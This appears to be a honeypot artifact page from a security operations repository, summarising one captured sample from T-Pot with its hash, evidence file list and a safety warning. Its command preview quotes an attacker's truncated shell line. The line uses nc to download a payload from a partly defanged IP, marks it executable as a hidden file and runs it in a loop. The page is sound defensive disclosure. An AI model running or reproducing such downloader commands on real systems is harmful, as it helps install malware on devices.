# 9ec0680c88c20f69df67aeb8d42406a10356412220582ef072b79644c12ed752

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `9ec0680c88c20f69df67aeb8d42406a10356412220582ef072b79644c12ed752` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
sh -c "cd /data/local/tmp; nc 85[.]11[.]167.XXX 25565 > .system-update; chmod +x .system-update; (while true; do ./.system-u
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
